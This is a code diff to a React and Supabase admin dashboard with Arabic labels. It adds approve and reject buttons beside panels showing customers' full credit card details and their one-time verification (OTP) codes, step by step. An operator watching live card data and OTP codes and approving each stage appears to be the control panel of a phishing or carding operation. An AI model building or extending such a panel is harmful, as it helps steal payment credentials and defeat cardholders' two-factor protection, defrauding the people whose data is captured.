@@ -109,6 +109,31 @@ const DashboardApplications = () => {
     fetchApplications();
   };
 
+  const rejectStep = async (appId: string) => {
+    const { error } = await supabase
+      .from('customer_applications')
+      .update({ 
+        status: 'rejected'
+      })
+      .eq('id', appId);
+
+    if (error) {
+      toast({
+        title: "خطأ",
+        description: "حدث خطأ أثناء الرفض",
+        variant: "destructive"
+      });
+      return;
+    }
+
+    toast({
+      title: "تم الرفض",
+      description: "تم رفض الطلب",
+    });
+
+    fetchApplications();
+  };
+
   const getStepBadge = (approved: boolean) => {
     if (approved) {
       return <Badge className="bg-green-500"><CheckCircle className="w-3 h-3 mr-1" /> موافق عليه</Badge>;
@@ -274,7 +299,29 @@ const DashboardApplications = () => {
               {/* بيانات الدفع */}
               {selectedApp.cardholder_name && (
                 <div>
-                  <h3 className="font-bold mb-2 text-red-600">⚠️ بيانات البطاقة الائتمانية (سرية)</h3>
+                  <div className="flex items-center justify-between mb-3">
+                    <h3 className="font-bold text-red-600">⚠️ بيانات البطاقة الائتمانية (سرية)</h3>
+                    {!selectedApp.payment_approved && selectedApp.current_step === 'payment' && selectedApp.status !== 'rejected' && (
+                      <div className="flex gap-2">
+                        <Button
+                          onClick={() => approveStep(selectedApp.id, 'payment_approved')}
+                          size="sm"
+                          className="bg-green-600 hover:bg-green-700"
+                        >
+                          <CheckCircle className="h-4 w-4 ml-1" />
+                          موافق
+                        </Button>
+                        <Button
+                          onClick={() => rejectStep(selectedApp.id)}
+                          size="sm"
+                          variant="destructive"
+                        >
+                          <XCircle className="h-4 w-4 ml-1" />
+                          رفض
+                        </Button>
+                      </div>
+                    )}
+                  </div>
                   <div className="space-y-3 bg-red-50 dark:bg-red-950/20 p-4 rounded-lg border-2 border-red-200 dark:border-red-800">
                     <div>
                       <p className="text-xs text-muted-foreground mb-1">اسم حامل البطاقة:</p>
@@ -307,8 +354,30 @@ const DashboardApplications = () => {
               {/* كود OTP */}
               {selectedApp.otp_code && (
                 <div>
-                  <h3 className="font-bold mb-2">كود التحقق OTP</h3>
-                  <p className="text-2xl font-mono font-bold bg-muted p-4 rounded text-center">
+                  <div className="flex items-center justify-between mb-3">
+                    <h3 className="font-bold">🔐 كود التحقق OTP</h3>
+                    {!selectedApp.otp_approved && selectedApp.current_step === 'otp' && selectedApp.status !== 'rejected' && (
+                      <div className="flex gap-2">
+                        <Button
+                          onClick={() => approveStep(selectedApp.id, 'otp_approved')}
+                          size="sm"
+                          className="bg-green-600 hover:bg-green-700"
+                        >
+                          <CheckCircle className="h-4 w-4 ml-1" />
+                          موافق
+                        </Button>
+                        <Button
+                          onClick={() => rejectStep(selectedApp.id)}
+                          size="sm"
+                          variant="destructive"
+                        >
+                          <XCircle className="h-4 w-4 ml-1" />
+                          رفض
+                        </Button>
+                      </div>
+                    )}
+                  </div>
+                  <p className="text-3xl font-mono font-bold bg-primary/10 p-6 rounded-lg text-center text-primary border-2 border-primary/20">
                     {selectedApp.otp_code}
                   </p>
                 </div>
